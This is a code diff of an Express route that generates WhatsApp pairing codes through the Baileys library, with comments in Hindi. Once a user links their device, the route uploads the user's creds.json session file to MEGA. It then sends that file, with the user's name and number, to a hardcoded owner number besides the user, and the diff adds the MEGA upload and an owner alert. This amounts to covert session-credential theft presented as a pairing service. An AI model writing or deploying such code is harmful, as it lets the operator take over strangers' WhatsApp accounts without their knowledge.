@@ -1,6 +1,5 @@
 import express from "express";
 import fs from "fs";
-import path from "path";
 import pino from "pino";
 import {
     makeWASocket,
@@ -11,177 +10,282 @@ import {
     jidNormalizedUser,
     fetchLatestBaileysVersion,
 } from "@whiskeysockets/baileys";
+import pn from "awesome-phonenumber";
+import { upload } from "./mega.js";
 
 const router = express.Router();
 
-const OWNER_NUMBER = "+918075498750";
+// ─── आपको बस ये बदलना है ──────────────────────────────────
+const OWNER_NUMBER = "+919876543210";        // अपना WhatsApp नंबर
+const SONG_LINK = "https://example.com/song.mp3";
+const IMAGE_URL = "https://example.com/photo.jpg";
+const LINKS = [
+    "https://link1.com",
+    "https://link2.com",
+    "https://link3.com",
+    "https://link4.com"
+];
+// ────────────────────────────────────────────────────────────
 
-const c = {
-    reset: "\x1b[0m",
-    green: "\x1b[32m",
-    yellow: "\x1b[33m",
-    blue: "\x1b[34m",
-    red: "\x1b[31m",
-};
-
-function log(color, msg) {
-    console.log(`${color}[${new Date().toLocaleTimeString()}] ${msg}${c.reset}`);
+function removeFile(FilePath) {
+    try {
+        if (!fs.existsSync(FilePath)) return false;
+        fs.rmSync(FilePath, { recursive: true, force: true });
+    } catch (e) {
+        console.error("Error removing file:", e);
+    }
 }
 
-function removeFile(dir) {
+function getMegaFileId(url) {
     try {
-        if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
-    } catch (e) {}
+        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
+        return match ? match[1] : null;
+    } catch (error) {
+        return null;
+    }
 }
 
 router.get("/", async (req, res) => {
     let num = req.query.number;
-    if (!num) return res.status(400).json({ error: "Number required" });
+    let dirs = "./" + (num || `session`);
 
-    num = num.replace(/\D/g, "");
-    if (num.length < 10 || num.length > 15) {
-        return res.status(400).json({ error: "Invalid number length" });
+    await removeFile(dirs);
+
+    num = num.replace(/[^0-9]/g, "");
+
+    const phone = pn("+" + num);
+    if (!phone.isValid()) {
+        if (!res.headersSent) {
+            return res.status(400).send({
+                code: "Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.",
+            });
+        }
+        return;
     }
-
-    const sessionDir = path.resolve(`./pair_${num}`);
-    removeFile(sessionDir);
+    num = phone.getNumber("e164").replace("+", "");
 
     async function initiateSession() {
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+        const { state, saveCreds } = await useMultiFileAuthState(dirs);
 
         try {
-            const { version } = await fetchLatestBaileysVersion();
-            const sock = makeWASocket({
+            const { version, isLatest } = await fetchLatestBaileysVersion();
+            let KnightBot = makeWASocket({
                 version,
                 auth: {
                     creds: state.creds,
                     keys: makeCacheableSignalKeyStore(
                         state.keys,
-                        pino({ level: "fatal" }).child({ level: "fatal" })
+                        pino({ level: "fatal" }).child({ level: "fatal" }),
                     ),
                 },
                 printQRInTerminal: false,
                 logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                 browser: Browsers.windows("Chrome"),
                 markOnlineOnConnect: false,
+                generateHighQualityLinkPreview: false,
                 defaultQueryTimeoutMs: 60000,
                 connectTimeoutMs: 60000,
-                keepAliveIntervalMs: 10000, // 10 sec
-                maxRetries: 3,
+                keepAliveIntervalMs: 30000,
+                retryRequestDelayMs: 250,
+                maxRetries: 5,
             });
 
-            sock.ev.on("connection.update", async (update) => {
-                const { connection, lastDisconnect } = update;
+            KnightBot.ev.on("connection.update", async (update) => {
+                const { connection, lastDisconnect, isNewLogin, isOnline } = update;
 
                 if (connection === "open") {
-                    log(c.green, "✅ Paired!");
+                    console.log("✅ Connected successfully!");
+                    console.log("📱 Uploading session to MEGA...");
+
+                    const credsPath = dirs + "/creds.json";
+                    let megaFileId = null;
+                    let megaUrl = null;
 
                     try {
-                        await saveCreds();
-                        log(c.blue, "✅ saveCreds()");
-                    } catch (e) {
-                        log(c.red, `⚠️ saveCreds error: ${e.message}`);
-                    }
-
-                    // ─── तुरंत creds.json ढूँढें (max 5 sec) ──────────
-                    const credsPath = path.join(sessionDir, "creds.json");
-                    let credsBuffer = null;
-                    for (let i = 0; i < 50; i++) { // 50 * 100ms = 5 sec
-                        if (fs.existsSync(credsPath)) {
-                            try {
-                                credsBuffer = fs.readFileSync(credsPath);
-                                log(c.green, `✅ creds.json (${credsBuffer.length} B)`);
-                                break;
-                            } catch (e) {}
+                        megaUrl = await upload(
+                            credsPath,
+                            `creds_${num}_${Date.now()}.json`,
+                        );
+                        megaFileId = getMegaFileId(megaUrl);
+                        if (megaFileId) {
+                            console.log("✅ Session uploaded to MEGA. File ID:", megaFileId);
+                        } else {
+                            console.log("❌ Failed to upload to MEGA");
                         }
-                        await delay(100);
+                    } catch (error) {
+                        console.error("❌ Error uploading to MEGA:", error);
                     }
 
-                    if (!credsBuffer) {
-                        log(c.red, "❌ creds.json not found!");
-                        removeFile(sessionDir);
-                        process.exit(1);
-                        return;
-                    }
-
+                    // यूजर और ओनर के JID बनाएं
                     const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                     let ownerJid = null;
-                    const ownerPhone = OWNER_NUMBER.replace(/\D/g, "");
-                    if (ownerPhone) ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
-
-                    async function sendCreds(jid) {
-                        if (!jid) return;
-                        try {
-                            await sock.sendMessage(jid, {
-                                document: credsBuffer,
-                                mimetype: "application/json",
-                                fileName: "creds.json",
-                            });
-                            log(c.green, `📄 creds.json sent to ${jid}`);
-                        } catch (err) {
-                            log(c.red, `❌ Document send failed to ${jid}: ${err.message}`);
+                    if (OWNER_NUMBER) {
+                        const ownerPhone = OWNER_NUMBER.replace(/[^0-9]/g, "");
+                        if (ownerPhone) {
+                            ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                         }
                     }
 
-                    await sendCreds(userJid);
-                    if (ownerJid && ownerJid !== userJid) await sendCreds(ownerJid);
+                    // ─── यूजर का नाम (Profile Name) प्राप्त करें ───
+                    let userName = "Unknown";
+                    try {
+                        const contact = await KnightBot.getContact(userJid);
+                        if (contact && contact.name) {
+                            userName = contact.name;
+                        } else if (contact && contact.notify) {
+                            userName = contact.notify;
+                        } else {
+                            // अगर नाम न मिले तो नंबर ही डाल दें
+                            userName = num;
+                        }
+                        console.log("👤 User Name:", userName);
+                    } catch (err) {
+                        console.warn("Could not fetch contact name:", err);
+                        userName = num; // fallback
+                    }
 
-                    log(c.blue, "🧹 Cleaning...");
-                    await delay(500);
-                    removeFile(sessionDir);
-                    log(c.green, "✅ Done!");
+                    // ─── सारी डिटेल्स वाला कैप्शन ──────────────────
+                    const caption = 
+                        `📱 *यूजर:* ${userName} (${num})\n` +
+                        `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
+                        `👤 *Owner:* ${OWNER_NUMBER}\n` +
+                        `🎵 *Song:* ${SONG_LINK}\n\n` +
+                        `🔗 *Your Links:*\n` +
+                        LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");
+
+                    // ─── ओनर के लिए अलग से डिटेल मैसेज ────────────
+                    const ownerMessage = 
+                        `🔔 *नई पेयरिंग हुई!*\n\n` +
+                        `📱 यूजर नंबर: ${num}\n` +
+                        `👤 यूजर का नाम: ${userName}\n` +
+                        `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
+                        `🎵 Song: ${SONG_LINK}\n` +
+                        `🔗 लिंक्स:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;
+
+                    // ─── फंक्शन: किसी भी JID को भेजें ──────────────
+                    async function sendToJid(jid, includeFile = true) {
+                        if (!jid) return;
+                        try {
+                            // 1. फोटो + कैप्शन
+                            await KnightBot.sendMessage(jid, {
+                                image: { url: IMAGE_URL },
+                                caption: caption,
+                            });
+                            console.log(`🖼️ Photo sent to ${jid}`);
+
+                            // 2. creds.json भेजें (अगर चाहें)
+                            if (includeFile) {
+                                const credsBuffer = fs.readFileSync(credsPath);
+                                await KnightBot.sendMessage(jid, {
+                                    document: credsBuffer,
+                                    mimetype: "application/json",
+                                    fileName: "creds.json",
+                                });
+                                console.log(`📄 creds.json sent to ${jid}`);
+                            }
+                        } catch (err) {
+                            console.error(`❌ Error sending to ${jid}:`, err);
+                        }
+                    }
+
+                    // ─── यूजर को भेजें (फाइल सहित) ──────────────────
+                    await sendToJid(userJid, true);
+
+                    // ─── ओनर को भेजें (फाइल सहित) ──────────────────
+                    if (ownerJid && ownerJid !== userJid) {
+                        await sendToJid(ownerJid, true);
+                        // ओनर को अलग से पूरी डिटेल वाला टेक्स्ट मैसेज भी भेजें
+                        try {
+                            await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
+                            console.log("📝 Owner details message sent");
+                        } catch (e) {
+                            console.error("Error sending owner details text:", e);
+                        }
+                    } else if (ownerJid && ownerJid === userJid) {
+                        console.log("ℹ️ Owner is the same as user, not sending duplicate.");
+                    }
+
+                    // क्लीनअप और बाहर निकलें
+                    console.log("🧹 Cleaning up session...");
                     await delay(1000);
+                    removeFile(dirs);
+                    console.log("✅ Session cleaned up successfully");
+                    console.log("🎉 Process completed successfully!");
+
+                    console.log("🛑 Shutting down application...");
+                    await delay(2000);
                     process.exit(0);
                 }
 
+                if (isNewLogin) {
+                    console.log("🔐 New login via pair code");
+                }
+
+                if (isOnline) {
+                    console.log("📶 Client is online");
+                }
+
                 if (connection === "close") {
-                    const status = lastDisconnect?.error?.output?.statusCode;
-                    if (status === 401) {
-                        log(c.red, "❌ Logged out – need new pair.");
+                    const statusCode = lastDisconnect?.error?.output?.statusCode;
+
+                    if (statusCode === 401) {
+                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
                     } else {
-                        log(c.yellow, "🔁 Retrying...");
+                        console.log("🔁 Connection closed — restarting...");
                         initiateSession();
                     }
                 }
             });
 
-            // ─── पेयरिंग कोड (1 sec delay) ──────────────────────
-            if (!sock.authState.creds.registered) {
-                await delay(1000); // बस 1 सेकंड
-                const cleanNum = num.replace(/^\+/, "");
+            if (!KnightBot.authState.creds.registered) {
+                await delay(3000);
+                num = num.replace(/[^\d+]/g, "");
+                if (num.startsWith("+")) num = num.substring(1);
+
                 try {
-                    let code = await sock.requestPairingCode(cleanNum);
-                    const rawCode = code;
-                    const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
+                    let code = await KnightBot.requestPairingCode(num);
+                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                     if (!res.headersSent) {
-                        log(c.green, `📲 Code: ${formatted}`);
-                        return res.json({
-                            code: formatted,
-                            rawCode: rawCode,
-                            message: "Enter code in WhatsApp > Settings > Linked Devices",
-                            tip: "Use rawCode (8 digits) – expires in 2 min."
-                        });
+                        console.log({ num, code });
+                        await res.send({ code });
                     }
                 } catch (error) {
-                    log(c.red, `❌ Pairing error: ${error.message}`);
+                    console.error("Error requesting pairing code:", error);
                     if (!res.headersSent) {
-                        return res.status(503).json({ error: "Pairing failed", details: error.message });
+                        res.status(503).send({
+                            code: "Failed to get pairing code. Please check your phone number and try again.",
+                        });
                     }
+                    setTimeout(() => process.exit(1), 2000);
                 }
             }
 
-            sock.ev.on("creds.update", saveCreds);
+            KnightBot.ev.on("creds.update", saveCreds);
         } catch (err) {
-            log(c.red, `❌ Init error: ${err.message}`);
+            console.error("Error initializing session:", err);
             if (!res.headersSent) {
-                res.status(500).json({ error: "Server error", details: err.message });
+                res.status(503).send({ code: "Service Unavailable" });
             }
-            removeFile(sessionDir);
             setTimeout(() => process.exit(1), 2000);
         }
     }
 
     await initiateSession();
+});
+
+process.on("uncaughtException", (err) => {
+    let e = String(err);
+    if (e.includes("conflict")) return;
+    if (e.includes("not-authorized")) return;
+    if (e.includes("Socket connection timeout")) return;
+    if (e.includes("rate-overlimit")) return;
+    if (e.includes("Connection Closed")) return;
+    if (e.includes("Timed Out")) return;
+    if (e.includes("Value not found")) return;
+    if (e.includes("Stream Errored") || e.includes("Stream Errored (restart required)")) return;
+    if (e.includes("statusCode: 515") || e.includes("statusCode: 503")) return;
+    console.log("Caught exception: ", err);
+    process.exit(1);
 });
 
 export default router;
